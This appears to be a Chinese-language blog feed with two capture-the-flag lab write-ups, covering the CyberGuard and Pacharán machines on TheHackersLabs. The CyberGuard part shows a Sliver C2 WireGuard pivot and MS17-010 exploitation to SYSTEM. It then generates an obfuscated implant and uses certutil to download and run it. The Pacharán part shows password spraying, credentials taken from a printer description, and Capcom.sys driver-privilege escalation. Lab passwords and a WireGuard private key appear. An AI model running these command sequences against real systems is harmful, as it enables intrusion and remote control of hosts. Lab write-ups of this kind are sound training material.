www-data@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ su ian
Password: 
ian@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ 
```

查看正在监听的端口

```bash
ian@TheHackersLabs-2-Cyberguard:~$ ss -tulpn
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                             
udp   UNCONN 0      0            0.0.0.0:59645      0.0.0.0:*                                                       
udp   UNCONN 0      0            0.0.0.0:51236      0.0.0.0:*    users:(("ss",pid=1098,fd=7),("bash",pid=1082,fd=7))
udp   UNCONN 0      0               [::]:51236         [::]:*    users:(("ss",pid=1098,fd=3),("bash",pid=1082,fd=3))
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                                       
tcp   LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*                                                       
tcp   LISTEN 0      128             [::]:22            [::]:*                                                       
tcp   LISTEN 0      511                *:8080             *:*  
```

查看 `ip` ，得到内网网段 `10.20.30.0/24`

```bash
www-data@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:f1:07:77 brd ff:ff:ff:ff:ff:ff
    inet 10.20.30.11/24 brd 10.20.30.255 scope global enp0s3
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fef1:777/64 scope link 
       valid_lft forever preferred_lft forever
```

### 搭建代理

方便渗透内网主机，这里使用 `sliver`  搭建代理

文档链接：https://sliver.sh/docs?name=Reverse+SOCKS

这里使用 `WireGuard SOCKS5`

```bash
sliver (FORMIDABLE_FLOOR) > info 

        Session ID: 160113c3-b76b-4b38-a5eb-a03335a7dbb8
              Name: FORMIDABLE_FLOOR
          Hostname: TheHackersLabs-2-Cyberguard
              UUID: ed3dcaa8-d130-48be-8973-73101c3c3c31
          Username: www-data
               UID: 33
               GID: 33
               PID: 1053
                OS: linux
           Version: Linux TheHackersLabs-2-Cyberguard 6.1.0-25-amd64
            Locale: C
              Arch: amd64
         Active C2: wg://10.0.2.20:53
    Remote Address: 100.64.0.3:65311
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Mon Jul 28 12:49:33 CST 2025 (40m46s ago)
      Last Checkin: Mon Jul 28 13:28:31 CST 2025 (1m48s ago)
```

创建 `WireGuard` 客户端配置

```bash
sliver (FORMIDABLE_FLOOR) > wg-config

[*] New client config:[Interface]
Address = 100.64.0.6/16
ListenPort = 51902
PrivateKey = MLVcslgYICxAUJMnhPF/h6LAiqOfjh1vF38pZdOt20w=
MTU = 1420

[Peer]
PublicKey = q36gtpUVlt9b9vCe4ZuM8+tU7zrDmN9SCAuSQ2jTYgQ=
AllowedIPs = 100.64.0.0/16
Endpoint = 10.0.2.20:53
```

使用 `wg-quick` 进行连接

```bash
➜  CyberGuard vim wgsocks.conf
```

```bash
➜  CyberGuard wg-quick up wgsocks            
[#] ip link add wgsocks type wireguard
[#] wg setconf wgsocks /dev/fd/63
[#] ip -4 address add 100.64.0.6/16 dev wgsocks
[#] ip link set mtu 1420 up dev wgsocks
```

再在 `sliver` 中运行 `wg-socks`

```bash
sliver (FORMIDABLE_FLOOR) > wg-socks start

[*] Started SOCKS server on 100.64.0.3:3090
```

编辑 `/etc/proxychains4.conf` 文件

![image.png](/post-images/TheHackersLabsCyberGuard/image13.png)

测试连接，使用代理连接 `10.20.30.11` 的 `SSH` 服务

![image.png](/post-images/TheHackersLabsCyberGuard/image14.png)

当前用户可以拿到 `user.txt`

```bash
ian@TheHackersLabs-2-Cyberguard:~$ cat user.txt 
1850axxxxxxxxxxxxxxxxxxxxxxxxx
```

### **10.20.30.11**

查看 `sudo` 权限

```bash
ian@TheHackersLabs-2-Cyberguard:~$ sudo -l
Matching Defaults entries for ian on TheHackersLabs-2-Cyberguard:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ian may run the following commands on TheHackersLabs-2-Cyberguard:
    (ALL) NOPASSWD: /usr/bin/tcpdump, /usr/sbin/arpspoof
```

我这里打算进行提权，但是`tcpdump` 并无法进行运行脚本，索性先放掉

这里上传 `fscan` 进行内网枚举

```bash
sliver (FORMIDABLE_FLOOR) > upload ../../Tools/fscan/fscan_1.8.4

[*] Wrote file to /var/www/cyberguard/config/fscan_1.8.4
```

指定 `IP` 范围 `10.20.30.1-255`

```bash
ian@TheHackersLabs-2-Cyberguard:~$ ./fscan_1.8.4 -h 10.20.30.1-255

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 10.20.30.11     is alive
(icmp) Target 10.20.30.1      is alive
(icmp) Target 10.20.30.3      is alive
(icmp) Target 10.20.30.15     is alive
[*] Icmp alive hosts len is: 4
10.20.30.3:445 open
10.20.30.3:139 open
10.20.30.3:135 open
10.20.30.1:80 open
10.20.30.15:22 open
10.20.30.11:22 open
10.20.30.11:8080 open
10.20.30.3:88 open
10.20.30.1:8090 open
[*] alive ports len is: 9
start vulscan
[+] MS17-010 10.20.30.3 (Windows Server 2016 Datacenter 14393)
[*] NetInfo 
[*]10.20.30.3
   [->]WIN-VRU3GG3DPLJ
   [->]10.20.30.3
[*] NetBios 10.20.30.3      [+] DC:WIN-VRU3GG3DPLJ.cyberguard.thl      Windows Server 2016 Datacenter 14393
[*] WebTitle http://10.20.30.11:8080   code:200 len:1045   title:Join Our Cybersecurity Team
[*] WebTitle http://10.20.30.1         code:200 len:1039   title:Join Our Cybersecurity Team
[*] WebTitle http://10.20.30.1:8090    code:200 len:2784   title:Login | OPNsense
```

### MS17-010 ✅

竟然枚举出来了 `10.20.30.3` 存在永恒之蓝（MS17-010），尝试一波

```bash
proxychains4 -q msfconsole
```

```bash
msf6 auxiliary(admin/smb/ms17_010_command) > run
[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393
[*] 10.20.30.3:445        - Built a write-what-where primitive...
[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!
[+] 10.20.30.3:445        - Service start timed out, OK if running a command or non-service executable...
[*] 10.20.30.3:445        - Getting the command output...
[*] 10.20.30.3:445        - Executing cleanup...
[+] 10.20.30.3:445        - Cleanup was successful
[+] 10.20.30.3:445        - Command completed successfully!
[*] 10.20.30.3:445        - Output for "whoami":

nt authority\system

[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

然后可以直接读取 `root.txt`

```bash
msf6 auxiliary(admin/smb/ms17_010_command) > set ComMAND type C:\\users\\Administrador\\Documents\\root.txt
ComMAND => type C:\users\Administrador\Documents\root.txt
msf6 auxiliary(admin/smb/ms17_010_command) > run
[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393
[*] 10.20.30.3:445        - Built a write-what-where primitive...
[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!
[+] 10.20.30.3:445        - Service start timed out, OK if running a command or non-service executable...
[*] 10.20.30.3:445        - Getting the command output...
[*] 10.20.30.3:445        - Executing cleanup...
[+] 10.20.30.3:445        - Cleanup was successful
[+] 10.20.30.3:445        - Command completed successfully!
[*] 10.20.30.3:445        - Output for "type C:\users\Administrador\Documents\root.txt":

0257xxxxxxxxxxxxxxxxxxxxxxxxx

[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

拿 `shell` 的话可以生成 `Windows` 植入物

```bash
sliver (FORMIDABLE_FLOOR) > generate -o windows --wg 10.0.2.20 -a amd64 -f exe 

[*] Generated unique ip for wg peer tun interface: 100.64.0.7
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 1m1s
[*] Implant saved to /root/Desktop/TheHackersLabs/CyberGuard/LONG_PRIVATE.exe
```

上传到 `10.20.30.11` 并开启 `HTTP` 服务器

```bash
ian@TheHackersLabs-2-Cyberguard:~$ python3 -m http.server 2131
Serving HTTP on 0.0.0.0 port 2131 (http://0.0.0.0:2131/) ...
```

然后通过 `certutil.exe` 下载到 `c` 盘

```bash
msf6 auxiliary(admin/smb/ms17_010_command) > set command "certutil.exe -urlcache -split -f http://10.20.30.11:2131/LONG_PRIVATE.exe C:\\LONG_PRIVATE.exe"
"
msf6 auxiliary(admin/smb/ms17_010_command) > run
[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393
[*] 10.20.30.3:445        - Built a write-what-where primitive...
[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!
[+] 10.20.30.3:445        - Service start timed out, OK if running a command or non-service executable...
[*] 10.20.30.3:445        - Getting the command output...
[*] 10.20.30.3:445        - Executing cleanup...
[+] 10.20.30.3:445        - Cleanup was successful
[+] 10.20.30.3:445        - Command completed successfully!
[*] 10.20.30.3:445        - Output for "certutil.exe -urlcache -split -f http://10.20.30.11:2131/LONG_PRIVATE.exe":

****  En lnea  ****
  000000  ...
  1280000
CertUtil: -URLCache comando completado correctamente.

[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

之后运行 `LONG_PRIVATE.exe`

```bash
msf6 auxiliary(admin/smb/ms17_010_command) > set command "C:\\LONG_PRIVATE.exe"
msf6 auxiliary(admin/smb/ms17_010_command) > run
```

![image.jpg](/post-images/TheHackersLabsCyberGuard/images15.jpg)

然后就拿到 `shell` 了

```bash
sliver (LONG_PRIVATE) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 1292

PS C:\Windows\system32> whoami
whoami
nt authority\system
```

## 总结

蛮难的，在弹 `shell`的时候卡了很久（这里看了`WP`才知道要用`sliver`弹）

打完之后发现，预期解并不是使用 `MS17-010`

而是在另外一台 `Linux` 主机中监听数据包能得到 `Victor` 用户的 `Net-NTLM-hash` ，之后再使用 `certipy` 进行操作

预期解WP：https://blog.thehackerslabs.com/resolucion-del-ctf-cyberguard/

还有学习到了 `sliver` 这个 `C2` 框架，感觉还不错，不用自己再端口转发才能上线]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>Linux</category>
            <category>MS17-010</category>
            <category>Sliver</category>
            <category>SQLInjection</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Pacharán]]></title>
            <link>https://www.sunsetaction.top/2025/07/27/TheHackersLabsPacharán</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/27/TheHackersLabsPacharán</guid>
            <pubDate>Sun, 27 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Pacharán https://labs.thehackerslabs.com/machine/61 Recon PortScan 枚举 SMB 匿名测试 可以使用匿名账户 直接用nxc全部拉下来 得到一个 txt 文件 Orujo.txt 像是一个凭据，测试一下 成功拿到 orujo 的凭据 域...]]></description>
            <content:encoded><![CDATA[
# Pacharán

> https://labs.thehackerslabs.com/machine/61
> 

![image.png](/post-images/TheHackersLabsPacharán/image.png)

## Recon

### PortScan

```bash
➜  Pacharán nmap -sn 192.168.69.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:00 CST
Nmap scan report for 192.168.69.1
Host is up (0.00060s latency).
MAC Address: 0A:00:27:00:00:11 (Unknown)
Nmap scan report for 192.168.69.2
Host is up (0.00034s latency).
MAC Address: 08:00:27:5F:F4:7E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.69.69
Host is up (0.00060s latency).
MAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.69.10
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.10 seconds
```

```bash
➜  Pacharán nmap -sT -min-rate 10000 -p- 192.168.69.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:00 CST
Warning: 192.168.69.69 giving up on port because retransmission cap hit (10).
Strange read error from 192.168.69.69 (104 - 'Connection reset by peer')
Nmap scan report for 192.168.69.69
Host is up (0.00020s latency).
Not shown: 65236 closed tcp ports (conn-refused), 275 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm

MAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds
```

```bash
➜  Pacharán nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.69.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:01 CST
Nmap scan report for 192.168.69.69
Host is up (0.00052s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-27 12:01:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
MAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2016|2019
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2016 or Server 2019
Network Distance: 1 hop
Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:4f:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-time:
|   date: 2025-07-27T12:01:36
|_  start_date: 2025-07-27T11:55:15
|_clock-skew: 6h59m57s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 192.168.69.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.47 seconds
```

### 枚举

`SMB` 匿名测试

可以使用匿名账户

```bash
➜  Pacharán smbclient -L 192.168.69.69 -U anonymous
Password for [WORKGROUP\anonymous]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión 
        NETLOGON2       Disk      
        PACHARAN        Disk      
        PDF Pro Virtual Printer Printer   Soy Hacker y arreglo impresoras
        print$          Disk      Controladores de impresora
        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.69.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

直接用`nxc`全部拉下来

```bash
➜  Pacharán nxc smb 192.168.69.69 -u 'anonymous' -p '' --smb-timeout 9999 -M spider_plus -o DOWNLOAD_FLAG=True 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\anonymous: (Guest)
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Started module spidering_plus with the following options:
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]     STATS_FLAG: True
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Enumerated shares
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  -----           -----------     ------
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON                        Recurso compartido del servidor de inicio de sesión 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON2       READ            
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PACHARAN                        
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PDF Pro Virtual Printer                 Soy Hacker y arreglo impresoras
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  print$                          Controladores de impresora
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  SYSVOL                          Recurso compartido del servidor de inicio de sesión 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Users                           
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/192.168.69.69.json".
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Shares:           10 (ADMIN$, C$, IPC$, NETLOGON, NETLOGON2, PACHARAN, PDF Pro Virtual Printer, print$, SYSVOL, Users)
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Readable Shares:  2 (IPC$, NETLOGON2)
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Filtered Shares:  1
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Total folders found:  0
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Total files found:    1
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size average:    22 B
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size min:        22 B
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size max:        22 B
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File unique exts:     1 (txt)
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Downloads successful: 1
SPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] All files processed successfully.
```

得到一个 `txt` 文件 `Orujo.txt`

```bash
➜  Pacharán cat Orujo.txt                                 
Pericodelospalotes6969#
```

像是一个凭据，测试一下

```bash
➜  Pacharán nxc smb 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969' --smb-timeout 9999                             
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\orujo:Pericodelospalotes6969 
```

成功拿到 `orujo` 的凭据

```bash
➜  Pacharán nxc ldap 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969'                                  
LDAP        192.168.69.69   389    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)
LDAP        192.168.69.69   389    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\orujo:Pericodelospalotes6969

➜  Pacharán nxc winrm 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969'
WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\orujo:Pericodelospalotes6969
```

## 域分析

收集信息上`BLoodHound`

```bash
➜  Pacharán bloodhound-python -d 'PACHARAN.thl' -ns 192.168.69.69 --zip -c All -dc 'WIN-VRU3GG3DPLJ.PACHARAN.THL' -u orujo -p 'Pericodelospalotes6969'
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: pacharan.thl
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.PACHARAN.THL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.PACHARAN.THL
INFO: Found 17 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WIN-VRU3GG3DPLJ.PACHARAN.THL
INFO: Done in 00M 01S
INFO: Compressing output into 20250727132554_bloodhound.zip
```

当前用户所属组

![image.png](/post-images/TheHackersLabsPacharán/image1.png)

所有域用户

![image.png](/post-images/TheHackersLabsPacharán/image2.png)

远程管理组成员，只有一个，暂时设定为目标用户

![image.png](/post-images/TheHackersLabsPacharán/image3.png)

## To Whisky

我们继续枚举一下信息

拉取 `orujo` 用户可以下载的所有文件

```bash
nxc smb 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969' --smb-timeout 9999 -M spider_plus -o DOWNLOAD_FLAG=True
```

能下载出来一个 `au.txt` 文件，是一个密码字典

![image.png](/post-images/TheHackersLabsPacharán/image4.png)

查询一下密码阈值

```bash
➜  PACHARAN bloodyAD -d 'PACHARAN.THL' -u orujo -p 'Pericodelospalotes6969' --dc-ip 192.168.69.69 get object 'DC=PACHARAN,DC=THL' --attr minPwdLength,maxPwdAge,minPwdAge,pwdHistoryLength,lockoutThreshold,lockoutDuration,lockOutObservationWindow,pwdProperties

distinguishedName: DC=PACHARAN,DC=THL
lockOutObservationWindow: -18000000000
lockoutDuration: -18000000000
lockoutThreshold: 0
maxPwdAge: -42 days, 0:00:00
minPwdAge: -1 day, 0:00:00
minPwdLength: 7
pwdHistoryLength: 24
pwdProperties: 1
```

密码阈值为`0` ，锁定账户功能被禁用

所以我们可以利用得到的字典来进行密码喷洒

```bash
➜  Pacharán nxc smb 192.168.69.69 -u users.txt  -p ah.txt --smb-timeout 9999 --continue-on-success | grep '[+]'
SMB                      192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Whisky:MamasoyStream2er@ 
```

得到`Whisky`的凭据，`Whisky:MamasoyStream2er@` 

## To Chivas Regal

这里尝试了很多的攻击，例如 `Kerberoate`等

再尝试枚举一下信息

SMB 中我们能注意到 **`PDF Pro Virtual Printer WRITE`** ，应该是打印机共享

并且描述：我是一名黑客，我修理打印机，通用文档转换器

![image.png](/post-images/TheHackersLabsPacharán/image5.png)

尝试连接上`RPCclient` 枚举打印机

```bash
➜  Pacharán rpcclient 192.168.69.69 -U pacharan.thl/Whisky%MamasoyStream2er@ 
rpcclient $> enumprinters
        flags:[0x800000]
        name:[\\192.168.69.69\Soy Hacker y arreglo impresoras]
        description:[\\192.168.69.69\Soy Hacker y arreglo impresoras,Universal Document Converter,TurkisArrusPuchuchuSiu1]
        comment:[Soy Hacker y arreglo impresoras]
```

我们还看到描述后还带这个字符串 `TurkisArrusPuchuchuSiu1` 

我们将其拿去进行密码喷洒

```bash
➜  Pacharán nxc smb 192.168.69.69 -u users.txt -p 'TurkisArrusPuchuchuSiu1' --smb-timeout 9999                
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Administrador:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Invitado:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\krbtgt:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\DefaultAccount:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Ginebra:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Whisky:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Hendrick:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1
```

得到一个凭据：`ChivasRegal:TurkisArrusPuchuchuSiu1`

就是我们上边看到远程管理组的用户

```bash
➜  Pacharán nxc winrm 192.168.69.69 -u 'Chivas Regal' -p 'TurkisArrusPuchuchuSiu1'
WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1 (Pwn3d!)
```

`Chivas Regal` 用户可以读取 `user.txt`

```bash
*Evil-WinRM* PS C:\Users\Chivas Regal\Desktop> type user.txt
bb8b4xxxxxxxxxxxxxxxxxxxxxxxxxx
```

## SeLoadDriverPrivilege

`whoami` 信息

![image.png](/post-images/TheHackersLabsPacharán/image6.png)

能找到 `SeLoadDriverPrivilege` ，这是默认的账户不存在的权限

能找一些存储库： https://github.com/k4sth4/SeLoadDriverPrivilege

```bash
*Evil-WinRM* PS C:\temp> .\ExploitCapcom.exe LOAD C:\temp\Capcom.sys
[*] Service Name: uciifgxe
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-3046175042-3013395696-775018414-1108\???????????????????
NTSTATUS: 00000000, WinError: 0

*Evil-WinRM* PS C:\temp> .\ExploitCapcom.exe EXPLOIT whoami
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 0000013180FE0008
[+] Shellcode was executed
[+] Token stealing was successful
[+] Command Executed
